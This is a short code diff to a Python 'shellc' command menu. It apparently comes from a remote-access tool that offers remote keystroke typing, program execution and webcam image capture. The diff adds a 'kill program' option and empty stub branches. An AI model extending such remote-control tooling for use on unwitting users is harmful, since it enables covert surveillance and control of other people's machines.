@@ -320,9 +320,10 @@ def shellc():
                    -send_key  >> type keyboard
                    ================================ 
 
-                     execution
+                     execution:
                    ================================
                    -execute     >> execute program
+                   -kill        >> kill program
                    =================================
                    
                    """)
@@ -338,6 +339,8 @@ def shellc():
              x += 1
              start_image_server(save_as='webcam'+str(x)+'.jpg') 
           elif perintah[:7] == 'execute':
+              pass  
+          elif perintah[:4] == 'kill':
               pass  
           else:
              hasil = data_diterima()
